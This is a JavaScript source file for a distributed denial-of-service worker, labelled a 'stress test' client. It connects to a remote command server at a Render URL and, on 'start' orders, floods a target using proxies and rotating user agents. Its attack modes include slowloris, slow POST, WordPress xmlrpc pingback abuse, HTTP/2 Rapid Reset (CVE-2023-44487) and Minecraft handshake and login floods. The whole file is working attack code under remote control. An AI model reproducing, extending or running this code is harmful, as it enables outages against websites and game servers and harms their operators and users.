const WebSocket = require('ws');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const dns = require('dns').promises;
const net = require('net');
const fs = require('fs');
const { SocksClient } = require('socks');

// IMPORTANT: Use wss:// for secure WebSocket (Render uses HTTPS)
const SERVER_URL = 'wss://new2-9ho5.onrender.com';

// Load user agents from headers.txt
let userAgents = [];
function loadUserAgents() {
  try {
    const data = fs.readFileSync('headers.txt', 'utf8');
    userAgents = data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    console.log(`[✓] Loaded ${userAgents.length} user agents from headers.txt`);
  } catch (error) {
    console.log('[!] headers.txt not found, using default user agents');
    userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
  }
}

// Load proxies from proxies.txt (format: ip:port or ip:port:user:pass)
let proxies = [];
function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf8');
    proxies = data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(line => {
        const parts = line.split(':');
        if (parts.length === 2) {
          return { host: parts[0], port: parseInt(parts[1]) };
        } else if (parts.length === 4) {
          return { host: parts[0], port: parseInt(parts[1]), user: parts[2], pass: parts[3] };
        }
        return null;
      })
      .filter(p => p !== null);
    console.log(`[✓] Loaded ${proxies.length} proxies from proxies.txt`);
  } catch (error) {
    console.log('[!] proxies.txt not found, direct connection will be used');
  }
}

// Load files on startup
loadUserAgents();
loadProxies();

// DNS Cache to bypass DNS throttling
const dnsCache = new Map();

// HTTP agents for connection pooling
const httpAgent = new http.Agent({
  keepAlive: true,
  maxSockets: 500,
  maxFreeSockets: 100
});

const httpsAgent = new https.Agent({
  keepAlive: true,
  maxSockets: 500,
  maxFreeSockets: 100,
  rejectUnauthorized: false
});

let ws;
let isRunning = false;
let stats = { sent: 0, success: 0, failed: 0 };
let currentConfig = null;
let attackStartTime = null;
let keepAliveInterval = null;
let http2Sessions = new Map();
let currentUserAgent = '';
let currentProxy = null;

function connect() {
  console.log('[*] Connecting to command server...');
  ws = new WebSocket(SERVER_URL);
  
  const connectionTimeout = setTimeout(() => {
    if (ws.readyState !== WebSocket.OPEN) {
      log('⚠ Connection timeout, retrying...');
      ws.terminate();
    }
  }, 10000);
  
  ws.on('open', () => {
    clearTimeout(connectionTimeout);
    log('✓ Connected to command server');
    
    // Send worker info including loaded resources
    ws.send(JSON.stringify({ 
      type: 'identify', 
      role: 'worker',
      info: {
        userAgents: userAgents.length,
        proxies: proxies.length
      }
    }));
    
    if (keepAliveInterval) clearInterval(keepAliveInterval);
    keepAliveInterval = setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        try {
          ws.ping();
        } catch (e) {
          console.error('[!] Keepalive ping failed');
        }
      }
    }, 25000);
  });

  ws.on('message', async (data) => {
    const message = JSON.parse(data);
    
    if (message.type === 'ready') {
      log('✓ Worker ready - awaiting orders');
    }
    
    if (message.type === 'start') {
      log('⚡ Attack orders received!');
      currentConfig = message.config;
      startAttack(currentConfig);
    }
    
    if (message.type === 'stop') {
      log('⏹ Stop command received');
      stopAttack();
    }
  });
  
  ws.on('ping', () => {
    ws.pong();
  });

  ws.on('close', (code, reason) => {
    clearTimeout(connectionTimeout);
    if (keepAliveInterval) clearInterval(keepAliveInterval);
    log(`✗ Disconnected from server (code: ${code})`);
    stopAttack();
    setTimeout(connect, 2000);
  });

  ws.on('error', (err) => {
    clearTimeout(connectionTimeout);
    console.error('[!] WebSocket error:', err.message);
  });
}

async function startAttack(config) {
  isRunning = true;
  stats = { sent: 0, success: 0, failed: 0 };
  attackStartTime = Date.now();
  
  // Set initial user agent and proxy
  currentUserAgent = getRandomUserAgent();
  currentProxy = config.useProxy ? getRandomProxy() : null;
  
  log(`🎯 Target: ${config.target}`);
  log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms`);
  log(`⚡ Attack Mode: ${config.attackMode || 'standard'}`);
  log(`👤 User-Agent Rotation: ${config.rotateUserAgent ? 'ON' : 'OFF'} (${userAgents.length} loaded)`);
  log(`🔄 Proxy: ${config.useProxy ? 'ON' : 'OFF'} (${proxies.length} loaded)`);
  if (currentProxy) {
    log(`📍 Using Proxy: ${currentProxy.host}:${currentProxy.port}`);
  }
  log('🚀 ATTACK STARTED');
  
  const endTime = attackStartTime + (config.duration * 1000);
  
  const threads = [];
  for (let i = 0; i < config.threads; i++) {
    threads.push(attackThread(config, endTime));
  }
  
  const statsInterval = setInterval(() => {
    if (isRunning) {
      reportStats();
      updateDisplay();
    }
  }, 1000);
  
  await Promise.all(threads);
  
  clearInterval(statsInterval);
  
  // Cleanup HTTP/2 sessions
  http2Sessions.forEach(session => {
    try {
      session.close();
    } catch (e) {}
  });
  http2Sessions.clear();
  
  const duration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
  const rps = (stats.sent / duration).toFixed(2);
  
  reportStats();
  
  if (isRunning) {
    console.log('\n');
    console.log('╔════════════════════════════════════════╗');
    console.log('║       ATTACK SUMMARY REPORT            ║');
    console.log('╠════════════════════════════════════════╣');
    console.log(`║  Duration:            ${duration.toString().padStart(16)}s ║`);
    console.log(`║  Requests Sent:       ${stats.sent.toString().padStart(16)} ║`);
    console.log(`║  Successful:          ${stats.success.toString().padStart(16)} ║`);
    console.log(`║  Failed:              ${stats.failed.toString().padStart(16)} ║`);
    console.log(`║  Success Rate:        ${stats.sent > 0 ? ((stats.success/stats.sent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
    console.log(`║  Avg Speed:           ${rps.toString().padStart(12)} req/s ║`);
    console.log('╚════════════════════════════════════════╝');
    isRunning = false;
    attackStartTime = null;
  }
}

async function attackThread(config, endTime) {
  const isMinecraft = config.attackMode && config.attackMode.startsWith('minecraft-');
  const isHTTP2 = config.attackMode === 'http2-rapid-reset';
  
  let resolvedIP = null;
  if (config.bypassDNS || isMinecraft) {
    try {
      const target = isMinecraft ? config.target : new URL(config.target).hostname;
      resolvedIP = await resolveDNS(target);
    } catch (e) {
      log('⚠ DNS resolution failed, using hostname');
    }
  }
  
  while (isRunning && Date.now() < endTime) {
    if (isMinecraft) {
      sendMinecraftAttack(config, resolvedIP);
    } else if (isHTTP2) {
      await sendHTTP2RapidReset(config);
    } else {
      sendRequestNoWait(config, resolvedIP);
    }
    stats.sent++;
    
    if (config.delay > 0) {
      await sleep(config.delay);
    }
  }
}

async function resolveDNS(hostname) {
  if (dnsCache.has(hostname)) {
    return dnsCache.get(hostname);
  }
  
  try {
    const addresses = await dns.resolve4(hostname);
    const ip = addresses[0];
    dnsCache.set(hostname, ip);
    log(`✓ DNS resolved: ${hostname} -> ${ip}`);
    return ip;
  } catch (error) {
    return null;
  }
}

function getRandomUserAgent() {
  if (userAgents.length === 0) return 'Mozilla/5.0';
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomProxy() {
  if (proxies.length === 0) return null;
  return proxies[Math.floor(Math.random() * proxies.length)];
}

function getRandomHeaders(config) {
  // Rotate user agent if enabled
  if (config.rotateUserAgent) {
    currentUserAgent = getRandomUserAgent();
  }
  
  const headers = {
    'User-Agent': currentUserAgent,
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
  };
  
  if (config.randomHeaders) {
    const extraHeaders = {
      'DNT': '1',
      'Cache-Control': 'max-age=0',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'X-Requested-With': 'XMLHttpRequest'
    };
    
    Object.keys(extraHeaders).forEach(key => {
      if (Math.random() > 0.5) {
        headers[key] = extraHeaders[key];
      }
    });
  }
  
  if (config.randomReferer) {
    const referers = [
      'https://www.google.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.reddit.com/',
      'https://www.youtube.com/',
      'https://www.bing.com/',
      'https://www.instagram.com/'
    ];
    headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
  }
  
  if (config.cookieFlood) {
    const cookies = [];
    for (let i = 0; i < 10; i++) {
      cookies.push(`session_${i}=${Math.random().toString(36).substring(7)}`);
    }
    headers['Cookie'] = cookies.join('; ');
  }
  
  if (config.rangeHeader) {
    const start = Math.floor(Math.random() * 1000);
    headers['Range'] = `bytes=${start}-${start + 50}`;
  }
  
  return headers;
}

function getAttackPath(config, url) {
  let path = url.pathname + url.search;
  
  if (config.cacheBust) {
    const separator = url.search ? '&' : '?';
    path += `${separator}_=${Date.now()}${Math.random()}`;
  }
  
  if (config.randomParams) {
    const separator = path.includes('?') ? '&' : '?';
    const randomParams = [
      `v=${Math.floor(Math.random() * 99999)}`,
      `t=${Date.now()}`,
      `r=${Math.random().toString(36).substring(7)}`,
      `cb=${Math.floor(Math.random() * 999999)}`
    ];
    path += separator + randomParams[Math.floor(Math.random() * randomParams.length)];
  }
  
  return path;
}

function getAttackPayload(config) {
  const mode = config.attackMode || 'standard';
  
  switch(mode) {
    case 'xmlrpc':
      return `<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>${config.target}</string></value></param>
    <param><value><string>${config.target}</string></value></param>
  </params>
</methodCall>`;
    
    case 'api-abuse':
      return JSON.stringify({
        data: Array(100).fill('x'.repeat(100)).join(''),
        timestamp: Date.now(),
        nonce: Math.random().toString(36)
      });
    
    case 'slow-post':
      return 'data=' + 'A'.repeat(10);
    
    default:
      return config.postData || '';
  }
}

// HTTP/2 Rapid Reset Attack (CVE-2023-44487)
async function sendHTTP2RapidReset(config) {
  try {
    const url = new URL(config.target);
    const sessionKey = `${url.hostname}:${url.port || 443}`;
    
    let client = http2Sessions.get(sessionKey);
    
    if (!client || client.destroyed) {
      client = http2.connect(url.origin, {
        rejectUnauthorized: false
      });
      
      client.on('error', () => {
        http2Sessions.delete(sessionKey);
      });
      
      http2Sessions.set(sessionKey, client);
    }
    
    // Create stream and immediately reset it (Rapid Reset)
    const stream = client.request({
      ':method': config.method || 'GET',
      ':path': getAttackPath(config, url),
      'user-agent': getRandomUserAgent()
    });
    
    // Immediately send RST_STREAM to reset the request
    stream.close(http2.constants.NGHTTP2_CANCEL);
    
    stats.success++;
    
  } catch (error) {
    stats.failed++;
  }
}

function sendRequestNoWait(config, resolvedIP) {
  try {
    const url = new URL(config.target);
    const protocol = url.protocol === 'https:' ? https : http;
    const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
    const mode = config.attackMode || 'standard';
    
    // Get proxy if enabled
    const proxy = config.useProxy ? getRandomProxy() : null;
    if (proxy && config.useProxy) {
      currentProxy = proxy;
    }
    
    const options = {
      hostname: resolvedIP || url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: getAttackPath(config, url),
      method: config.method,
      headers: getRandomHeaders(config),
      timeout: mode === 'slowloris' ? 300000 : 5000,
      agent: agent
    };
    
    if (resolvedIP) {
      options.headers['Host'] = url.hostname;
    }
    
    if (mode === 'xmlrpc') {
      options.method = 'POST';
      options.headers['Content-Type'] = 'text/xml';
      options.path = '/xmlrpc.php';
    }
    
    if (mode === 'api-abuse') {
      options.method = 'POST';
      options.headers['Content-Type'] = 'application/json';
    }
    
    // Proxy support
    if (proxy && config.useProxy) {
      const socksOptions = {
        proxy: {
          host: proxy.host,
          port: proxy.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: options.hostname,
          port: options.port
        }
      };
      
      if (proxy.user && proxy.pass) {
        socksOptions.proxy.userId = proxy.user;
        socksOptions.proxy.password = proxy.pass;
      }
      
      SocksClient.createConnection(socksOptions).then(info => {
        options.createConnection = () => info.socket;
        makeRequest(protocol, options, config, mode);
      }).catch(() => {
        stats.failed++;
      });
    } else {
      makeRequest(protocol, options, config, mode);
    }
    
  } catch (error) {
    stats.failed++;
  }
}

function makeRequest(protocol, options, config, mode) {
  const req = protocol.request(options, (res) => {
    stats.success++;
    res.resume();
  });
  
  req.on('error', () => {
    stats.failed++;
  });
  
  req.on('timeout', () => {
    stats.failed++;
    req.destroy();
  });
  
  if (mode === 'slowloris') {
    req.write('X-');
    setTimeout(() => {
      if (!req.destroyed) {
        req.write('a: b\r\n');
      }
    }, 10000);
  } else if (mode === 'slow-post') {
    const payload = getAttackPayload(config);
    let sent = 0;
    const interval = setInterval(() => {
      if (sent < payload.length && !req.destroyed) {
        req.write(payload.charAt(sent));
        sent++;
      } else {
        clearInterval(interval);
        req.end();
      }
    }, 1000);
  } else {
    const payload = getAttackPayload(config);
    if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
      if (mode === 'xmlrpc') {
        options.headers['Content-Length'] = Buffer.byteLength(payload);
      }
      req.write(payload);
    }
    req.end();
  }
}

function stopAttack() {
  if (isRunning) {
    isRunning = false;
    reportStats();
    log('⏹ Attack stopped');
  }
}

function reportStats() {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'stats',
      stats: stats,
      currentUA: currentUserAgent.substring(0, 50) + '...',
      currentProxy: currentProxy ? `${currentProxy.host}:${currentProxy.port}` : 'Direct',
      uaCount: userAgents.length,
      proxyCount: proxies.length
    }));
  }
}

function updateDisplay() {
  if (!attackStartTime) return;
  
  const elapsed = (Date.now() - attackStartTime) / 1000;
  const successRate = stats.sent > 0 ? ((stats.success / stats.sent) * 100).toFixed(1) : 0;
  const rps = elapsed > 0 ? (stats.sent / elapsed).toFixed(0) : 0;
  
  process.stdout.write(`\r[📊] Sent: ${stats.sent} | Success: ${stats.success} | Failed: ${stats.failed} | Rate: ${successRate}% | RPS: ${rps}     `);
}

function log(message) {
  const time = new Date().toLocaleTimeString();
  console.log(`\n[${time}] ${message}`);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Minecraft Protocol Functions
function writeVarInt(value) {
  const bytes = [];
  while (true) {
    if ((value & ~0x7F) === 0) {
      bytes.push(value);
      break;
    }
    bytes.push((value & 0x7F) | 0x80);
    value >>>= 7;
  }
  return Buffer.from(bytes);
}

function writeString(str) {
  const strBuf = Buffer.from(str, 'utf8');
  const lenBuf = writeVarInt(strBuf.length);
  return Buffer.concat([lenBuf, strBuf]);
}

function createHandshakePacket(host, port) {
  const packetId = Buffer.from([0x00]);
  const protocolVersion = writeVarInt(754);
  const serverAddress = writeString(host);
  const serverPort = Buffer.allocUnsafe(2);
  serverPort.writeUInt16BE(port, 0);
  const nextState = writeVarInt(1);
  
  const data = Buffer.concat([packetId, protocolVersion, serverAddress, serverPort, nextState]);
  const length = writeVarInt(data.length);
  
  return Buffer.concat([length, data]);
}

function createStatusRequestPacket() {
  const packetId = Buffer.from([0x00]);
  const length = writeVarInt(1);
  return Buffer.concat([length, packetId]);
}

function createLoginStartPacket(username) {
  const packetId = Buffer.from([0x00]);
  const playerName = writeString(username);
  const data = Buffer.concat([packetId, playerName]);
  const length = writeVarInt(data.length);
  return Buffer.concat([length, data]);
}

function sendMinecraftAttack(config, resolvedIP) {
  const mode = config.attackMode;
  const target = resolvedIP || config.target;
  const port = config.minecraftPort || 25565;
  
  try {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    
    socket.connect(port, target, () => {
      switch(mode) {
        case 'minecraft-handshake':
          const handshake = createHandshakePacket(config.target, port);
          socket.write(handshake);
          socket.destroy();
          stats.success++;
          break;
          
        case 'minecraft-ping':
          const handshakeForPing = createHandshakePacket(config.target, port);
          const statusRequest = createStatusRequestPacket();
          socket.write(Buffer.concat([handshakeForPing, statusRequest]));
          socket.destroy();
          stats.success++;
          break;
          
        case 'minecraft-login':
          const randomUser = 'Bot_' + Math.random().toString(36).substring(7);
          const handshakeForLogin = createHandshakePacket(config.target, port);
          handshakeForLogin[handshakeForLogin.length - 1] = 0x02;
          const loginStart = createLoginStartPacket(randomUser);
          socket.write(Buffer.concat([handshakeForLogin, loginStart]));
          setTimeout(() => socket.destroy(), 10000);
          stats.success++;
          break;
          
        case 'minecraft-join':
          const joinUser = 'Player_' + Math.random().toString(36).substring(7);
          const handshakeForJoin = createHandshakePacket(config.target, port);
          handshakeForJoin[handshakeForJoin.length - 1] = 0x02;
          const loginPacket = createLoginStartPacket(joinUser);
          socket.write(Buffer.concat([handshakeForJoin, loginPacket]));
          stats.success++;
          break;
      }
    });
    
    socket.on('error', () => {
      stats.failed++;
      socket.destroy();
    });
    
    socket.on('timeout', () => {
      stats.failed++;
      socket.destroy();
    });
    
  } catch (error) {
    stats.failed++;
  }
}

// ASCII Banner
console.log(`
╔════════════════════════════════════════╗
║     STRESS TEST WORKER CLIENT          ║
║         Node.js Edition                ║
╠════════════════════════════════════════╣
║  Server: ${SERVER_URL.substring(0, 36).padEnd(36)}║
╠════════════════════════════════════════╣
║  💡 For Render/HTTPS use wss://       ║
║  💡 For localhost use ws://           ║
╚════════════════════════════════════════╝
`);

connect();

process.on('SIGINT', () => {
  console.log('\n\n[!] Shutting down worker...');
  stopAttack();
  if (ws) ws.close();
  process.exit(0);
});
